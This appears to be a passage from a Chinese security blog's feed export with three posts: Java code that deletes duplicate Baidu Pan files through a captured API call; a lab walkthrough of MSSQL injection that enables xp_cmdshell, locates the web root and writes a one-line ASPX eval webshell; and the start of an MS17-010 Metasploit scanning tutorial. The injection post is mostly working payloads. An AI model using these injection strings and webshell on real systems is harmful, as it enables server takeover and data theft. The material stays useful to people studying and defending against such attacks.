Auto-generated catch block</span></span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">		DBFactory.close(rst, pst, conn);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ltMd5;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-根据步骤1获取文件的MD5值，获取最小path的长度"><a href="#2-根据步骤1获取文件的MD5值，获取最小path的长度" class="headerlink" title="2.根据步骤1获取文件的MD5值，获取最小path的长度"></a>2.根据步骤1获取文件的MD5值，获取最小path的长度</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据文件的MD5值，获取最小path的长度</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> md5</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">setp2</span><span class="params">(String md5)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> length = -<span class="number">1</span>;</span><br><span class="line">	String sql = <span class="string">"select min(LENGTH(path)) from mmpan where md5=?"</span>;</span><br><span class="line">	Connection conn = DBFactory.getConnection();</span><br><span class="line">	PreparedStatement pst = <span class="keyword">null</span>;</span><br><span class="line">	ResultSet rst = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		pst = conn.prepareStatement(sql);</span><br><span class="line">		pst.setString(<span class="number">1</span>, md5);</span><br><span class="line">		rst = pst.executeQuery();</span><br><span class="line">		<span class="keyword">if</span>(rst.next())&#123;</span><br><span class="line">			length = rst.getInt(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">		DBFactory.close(rst, pst, conn);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-根据MD5和最短路径，列出大于最短路径的文件"><a href="#3-根据MD5和最短路径，列出大于最短路径的文件" class="headerlink" title="3.根据MD5和最短路径，列出大于最短路径的文件"></a>3.根据MD5和最短路径，列出大于最短路径的文件</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据MD5和最短路径，列出大于最短路径的文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> md5</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> length</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">setp3</span><span class="params">(String md5,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">	List&lt;String&gt; ltPath = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">	String sql = <span class="string">"select path from mmpan where md5=? and LENGTH(path) &gt; ?"</span>;</span><br><span class="line">	Connection conn = DBFactory.getConnection();</span><br><span class="line">	PreparedStatement pst = <span class="keyword">null</span>;</span><br><span class="line">	ResultSet rst = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		pst = conn.prepareStatement(sql);</span><br><span class="line">		pst.setString(<span class="number">1</span>, md5);</span><br><span class="line">		pst.setInt(<span class="number">2</span>, length);</span><br><span class="line">		rst = pst.executeQuery();</span><br><span class="line">		<span class="keyword">while</span>(rst.next())&#123;</span><br><span class="line">			ltPath.add(rst.getString(<span class="number">1</span>));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		e.printStackTrace();</span><br><span class="line">	&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">		DBFactory.close(rst, pst, conn);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ltPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>获取这个列表是为了将其删除</p>
</blockquote>
<p>将以上三步综合起来，如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取指定条件下文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title">getPaths</span><span class="params">()</span></span>&#123;</span><br><span class="line">	List&lt;String&gt; ltPath = <span class="keyword">null</span>;</span><br><span class="line">	List&lt;String&gt; ltPaths = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">	List&lt;String&gt; lt = UtilMethod.setp1();</span><br><span class="line">	<span class="keyword">int</span> length = -<span class="number">1</span> ;</span><br><span class="line">	<span class="keyword">for</span> (String md5 : lt) &#123;</span><br><span class="line">		length = UtilMethod.setp2(md5);</span><br><span class="line">		ltPath = UtilMethod.setp3(md5, length);</span><br><span class="line">		<span class="keyword">for</span> (String path : ltPath) &#123;</span><br><span class="line">			ltPaths.add(path);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ltPaths;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此时列表中的文件都是为了删除的文件的路径。</p>
<h3 id="0x02-如何实现删除文件"><a href="#0x02-如何实现删除文件" class="headerlink" title="0x02 如何实现删除文件"></a>0x02 如何实现删除文件</h3><p>删除文件时抓包，发现如下请求<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken=****&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0 HTTP/1.1</span><br><span class="line">Host: pan.baidu.com</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Cookie: Cookie</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 61</span><br><span class="line"></span><br><span class="line">filelist=%5B%22%2F000%2F%E7%A4%BE%E5%B7%A5%E5%BA%93.rar%22%5D</span><br></pre></td></tr></table></figure></p>
<p>所需参数有bdstoken和删除文件的列表</p>
<p>我们首先将需要删除文件拼接起来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 根据文件路径拼接filelist</span><br><span class="line"> * @<span class="built_in">return</span></span><br><span class="line"> */</span><br><span class="line">public static String <span class="function"><span class="title">getFileList</span></span>()&#123;</span><br><span class="line">	List&lt;String&gt; ltPath = UtilMethod.getPaths();</span><br><span class="line">	StringBuilder sb = new StringBuilder();</span><br><span class="line">	sb.append(<span class="string">"["</span>);</span><br><span class="line">	<span class="keyword">for</span> (int i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">		//System.out.println(ltPath.get(i));</span><br><span class="line">		sb.append(<span class="string">"\""</span>);</span><br><span class="line">		sb.append(ltPath.get(i));</span><br><span class="line">		sb.append(<span class="string">"\""</span>);</span><br><span class="line">		sb.append(<span class="string">","</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	sb.append(<span class="string">"***]"</span>);</span><br><span class="line">	<span class="built_in">return</span> sb.toString().replace(<span class="string">",***"</span>, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>为了测试，我仅仅先删除三条进行测试。如果需要全部删除，将3换成ltPath.size()即可。</p>
</blockquote>
<p>删除文件的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据文件列表删除文件</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filelist</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">delRequest</span><span class="params">(String filelist)</span></span>&#123;</span><br><span class="line">	String url = <span class="string">"https://pan.baidu.com/api/filemanager?opera=delete&amp;async=2&amp;channel=chunlei&amp;web=1&amp;app_id=250528&amp;bdstoken="</span>+getbdstoken()+<span class="string">"&amp;logid=MTQ5NTU0ODk4Mjk2MjAuMzgyNjczNDYzNDM0MTU0NA==&amp;clienttype=0"</span>;</span><br><span class="line">	String result = <span class="string">"删除失败,请重试"</span>;</span><br><span class="line">	String jsonStr = getbody(url, getCookies(),filelist);</span><br><span class="line">	JSONObject jsonObj = JSONObject.parseObject(jsonStr);</span><br><span class="line">	<span class="keyword">if</span>(jsonObj.get(<span class="string">"errno"</span>).toString().equals(<span class="string">"0"</span>))&#123;</span><br><span class="line">		result = <span class="string">"文件删除成功，删除成功的文件为"</span>+filelist;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试删除的代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testdelFile</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	String fileList = UtilMethod.getFileList();</span><br><span class="line">	System.out.println(UtilMethod.delRequest(fileList));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>附上效果图<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/Java代码删除文件.gif" alt="Java代码删除文件"></p>
<p>大功告成。不过删除的时候要注意一下，删除错误的话可以去回收站查看，然后再恢复。不要急于清除回收站。<br>代码仅供参考。代码地址：<a href="http://fuping.site/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/BaiDuPan.rar">代码</a><br>Python的实现脚本<a href="https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py" target="_blank" rel="noopener">https://github.com/fupinglee/MyPython/blob/master/baidu/BDPandel.py</a> 。<br>python代码删除文件效果图<br><img src="/2017/05/24/Clean-Duplicate-Files-OF-BaiDu-YunPan/python代码删除文件.gif" alt="python代码删除文件"></p>
<p>还有一种最快的实现方法就是开个会员o(╯□╰)o。</p>
<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>本文没有什么大的知识点，都是常用的内容拼接在了一起。主要用到了三方面的内容：<br>1.如何模拟网络请求抓取数据。这里采用了Java代码，Http请求采用了Jsoup。<br>2.JSON解析，使用了FastJSON来实现<br>3.递归遍历的实现</p>
<p>Python的实现也就是请求Http和数据库的操作。使用Python时要多注意数据类型和编码的转换。</p>
]]></content>
      
        <categories>
            
            <category> 编程开发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 百度网盘 </tag>
            
            <tag> 快速清除 </tag>
            
            <tag> Java代码 </tag>
            
            <tag> Python脚本 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MSSQL DBA权限获取WEBSHELL的过程]]></title>
      <url>/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文主要通过一个案例来演示一下当MSSQL是DBA权限，且不知道路径的时候如何去获取WEBSHELL。当然这种方式对站库分离的无效。<br>我测试的环境是在Win7 64位下，数据库是SQLServer 2000，IIS版本是7.5，程序是采用风讯的CMS。后台登录后有多处注入，因为这里是演示用注入获取WEBSHELL，因此就不考虑后台上传的情况了，只是用注入来实现。</p>
<a id="more"></a>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先找到一个如下的注入点：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">' and 1=user;--</span></span><br></pre></td></tr></table></figure>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/注入点.png" alt="注入点"></p>
<p>通过SQLMAP可以查看到是DBA权限</p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/DBA权限.png" alt="DBA权限"></p>
<p>创建临时表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';CREATE TABLE tt_tmp (tmp1 varchar(8000));--</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/创建临时表.png" alt="创建临时表"></p>
<p>在WINDOWS下查找文件用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r 目录名:\ %i <span class="keyword">in</span> (匹配模式) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>
<p>例如在C盘下搜索NewsList.aspx，可以使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>或者<code>for /r c:\ %i in (Newslist.aspx*) do @echo %i</code></p>
<p>使用<code>for /r c:\ %i in (Newslist*.aspx) do @echo %i</code>的搜索结果<br><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/正确的搜索方式.png" alt="正确的搜索方式"></p>
<p>一定要在匹配模式里面加上一个*号，不然搜索出来的是全部的目录，后面拼接了你搜索的内容。<br>使用<code>for /r c:\ %i in (Newslist.aspx) do @echo %i</code>的搜索结果</p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/错误的搜索结果.png" alt="错误的搜索结果"></p>
<p>用xp_cmdshell执行查找文件的命令，并将搜索的结果插入到临时表中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';insert into tt_tmp(tmp1) exec master..xp_cmdshell '</span><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i <span class="string">';--</span></span><br></pre></td></tr></table></figure>
<p>如果无法执行xp_cmdshell，并提示如下错误<code>SQL Server阻止了对组件‘xp_cmdshell’的过程‘sys.xp_cmdshell’的访问。因为此组件已作为此服务嚣安全配置的一部分而被关闭。系统管理员可以通过使用sp_configure启用‘xp_cmdshell’。</code></p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/无法执行xp_cmdshell.png" alt="无法执行xp_cmdshell"></p>
<p>可以使用如下命令来启用xp_cmdshell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">;EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;--</span><br></pre></td></tr></table></figure>
<p>然后再次执行搜索命令。</p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/执行搜索并结果插入到临时表.png" alt="执行搜索并结果插入到临时表"></p>
<blockquote>
<p>在执行上述搜索和插入过程后，可以使用<code>&#39; and (select(*) from tt_tmp)&gt;1</code>页面返回是否正常来判断是否有搜索结果。当没有找到的话，<code>select(*) from tt_tmp</code>的结果为1，否则大于1。如果没有的话，就换目录，可以试试其他盘符，如<code>&#39;;insert into tt_tmp(tmp1) exec master..xp_cmdshell &#39;for /r d:\ %i in (Newslist*.aspx) do @echo %i &#39;;--</code>。也可以使用sqlmap来查看条数。</p>
</blockquote>
<p>可以用报错将表内容给显示出来<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp)and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出1.png" alt="报错读出1"></p>
<p>继续爆<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=2<span class="string">' and 1=(select top 1 tmp1 from tt_tmp where tmp1 not in ('</span>c:\inetpub\wwwroot\manage\news\NewsList.aspx <span class="string">'))and '</span>a<span class="string">'='</span>a</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/报错读出2.png" alt="报错读出2"></p>
<p>也可以用sqlmap直接将表中数据读取出来</p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/导出临时表.png" alt="导出临时表"></p>
<p>然后根据导出结果的路径来判断是否可能为WEB目录。然后写入一个测试文件，看是否可以访问来进一步证实结果。</p>
<p>这里在根目录写了一个txt文件，写别的目录怕因为没有权限而无法访问。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> <span class="built_in">test</span> &gt;c:\\WWW\\2333.txt<span class="string">';--</span></span><br></pre></td></tr></table></figure>
<p>然后访问<a href="http://192.168.232.138:81/2333.txt" target="_blank" rel="noopener">http://192.168.232.138:81/2333.txt</a></p>
<p><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/查看写入的测试文件.png" alt="查看写入的测试文件"></p>
<p>成功访问，然后就是写一句话</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.232.138:81/manage/news/Newslist.aspx?ClassID=1<span class="string">';exec master..xp_cmdshell '</span><span class="built_in">echo</span> ^&lt;%@ Page Language=<span class="string">"Jscript"</span>%^&gt;^&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">"pass"</span>],<span class="string">"unsafe"</span>);%^&gt; &gt; c:\\WWW\\233.aspx<span class="string">' ;--</span></span><br></pre></td></tr></table></figure>
<p>成功写入。然后就是进一步的操作了，这里就不概述了。<br><img src="/2017/05/16/MSSQL-DBA-Permission-GET-WEBSHELL/查看一句话.png" alt="查看一句话"></p>
<blockquote>
<p>DOS命令将文件写入文本中时，遇到<code>&lt;&gt;</code>应在前面加上<code>^</code>。</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里一共有三个小的知识点:<br>1.sa用户如何开启xp_cmdshell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure <span class="string">'show advanced options'</span>,1;//允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure <span class="string">'xp_cmdshell'</span>,1;  //打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure></p>
<p>2.Windows下利用dos如何搜索文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist*.aspx) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (Newslist.aspx*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure></p>
<p>3.dos命令下写文件遇到<code>&lt;&gt;</code>如何处理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;^&gt; &gt; 123.txt</span><br></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>[1]<a href="http://blog.csdn.net/cashey1991/article/details/44993403" target="_blank" rel="noopener">Windows命令行(cmd)下快速查找文件(类似Linux下find命令) </a><br>[2]<a href="http://www.freebuf.com/articles/web/55577.html" target="_blank" rel="noopener">技术分享：MSSQL注入xp_cmdshell</a></p>
]]></content>
      
        <categories>
            
            <category> 渗透测试 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MSSQL </tag>
            
            <tag> WEBSHELL </tag>
            
            <tag> ASPX </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MS17-010漏洞检测与内网穿透技术的应用]]></title>
      <url>/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/</url>
      <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本文主要介绍一下MSF模块的下载、使用，以及当攻击机处于内网，而目标机也处于内网的解决方法。这里借助MS17-010漏洞来具体讲解一下，并没有新的知识点，可以为刚入门的新手抛砖引玉，提供一条解决问题的思路，同时也记录一下过程，加强记忆。<br>主要分为两个知识点，一是SMB漏洞的批量检测，二是内网穿透技术。<br><a id="more"></a><br>首先是环境的搭建，具体如下表所示：</p>
<table>
<thead>
<tr>
<th>主机</th>
<th>IP</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>Kali 64位</td>
<td>192.168.232.134</td>
<td>攻击机</td>
</tr>
<tr>
<td>Windows XP 32位</td>
<td>192.168.232.128</td>
<td>安装了python2.6，下载有方程式利用工具包（主要为Windows目录下的工具）</td>
</tr>
<tr>
<td>Window2008 R2 64位</td>
<td>10.50.2.62</td>
<td>靶机，存在MS17-010漏洞，并可以访问外网</td>
</tr>
</tbody>
</table>
<h3 id="0x01-SMB漏洞批量检测"><a href="#0x01-SMB漏洞批量检测" class="headerlink" title="0x01 SMB漏洞批量检测"></a>0x01 SMB漏洞批量检测</h3><h4 id="1-扫描脚本的下载和加载"><a href="#1-扫描脚本的下载和加载" class="headerlink" title="1.扫描脚本的下载和加载"></a>1.扫描脚本的下载和加载</h4><p>由于Metasploit还没有更新MS17-010检测的模块，所以要去exploit-db下载，并在MSF中加载。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd /usr/share/metasploit-framework/modules/auxiliary/scanner/smb</span></span><br><span class="line">root@kali:/usr/share/metasploit-framework/modules/auxiliary/scanner/smb<span class="comment"># wget https://www.exploit-db.com/download/41891 -O smb_ms_17_010.rb</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/下载脚本.png" alt="下载脚本"></p>
<p>启动Metasploit，模块会自动加载，或者使用命令<code>reload_all</code>重新加载所有模块。</p>
<h4 id="2-漏洞扫描的使用方法"><a href="#2-漏洞扫描的使用方法" class="headerlink" title="2.漏洞扫描的使用方法"></a>2.漏洞扫描的使用方法</h4><p>选择使用smb_ms_17_010模块，并查看使用命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_ms_17_010</span><br><span class="line">msf auxiliary(smb_ms_17_010) &gt; show options</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/脚本说明.png" alt="脚本说明"></p>
<p>所必须的参数有三个，对于无需登录的SMB，我们只需设置一下扫描的IP段、线程并运行即可开始扫描。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(smb_ms_17_010) &gt; <span class="built_in">set</span> RHOSTS 10.50.2.1-255</span><br><span class="line">RHOSTS =&gt; 10.50.2.1-255</span><br><span class="line">msf auxiliary(smb_ms_17_010) &gt; <span class="built_in">set</span> THREADS 10</span><br><span class="line">THREADS =&gt; 10</span><br><span class="line">msf auxiliary(smb_ms_17_010) &gt; run</span><br></pre></td></tr></table></figure></p>
<p><img src="/2017/04/21/MS17-010-Vulnerability-Detection-And-Ngrok/扫描结果.png" alt="扫描结果"></p>
<p>出现黄色警告的表示可能存在，需要进一步验证。<br>为了方便将存在漏洞的IP列出来，写了一个简单的Python脚本。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">"smb.txt"</span>, mode=<span class="string">'r'</span>, buffering=1)</span><br><span class="line">    <span class="keyword">while</span>(True):</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line :</span><br><span class="line">                <span class="keyword">if</span>  <span class="string">"likely"</span> <span class="keyword">in</span> line:</span><br><span class="line">                    <span class="built_in">print</span> line.split(<span class="string">' '</span>)[1].split(<span class="string">':'</span>)[0]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>提取出的IP如下所示：</p>
